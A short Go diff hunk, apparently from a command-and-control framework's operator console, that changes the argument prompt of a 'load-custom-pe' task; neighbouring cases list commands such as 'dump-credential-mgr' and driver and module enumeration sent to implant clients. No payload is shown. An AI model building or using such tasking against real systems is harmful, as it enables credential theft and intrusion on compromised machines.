@@ -779,7 +779,7 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 	case "dump-credential-mgr":
 		PrepareTaskWithOneArg(c, clientId, command, "<pid>: ")
 	case "load-custom-pe":
-		PrepareShellcodeTask(c, clientId, command, "<Local PE to send> <exe,dll> <1,0>: ")
+		PrepareShellcodeTask(c, clientId, command, "<Local PE to send> <exe,dll> <exportNameIfDLL>: ")
 	case "enum-drivers":
 		PrepareTaskSimple(c, clientId, command)
 	case "enum-modules":
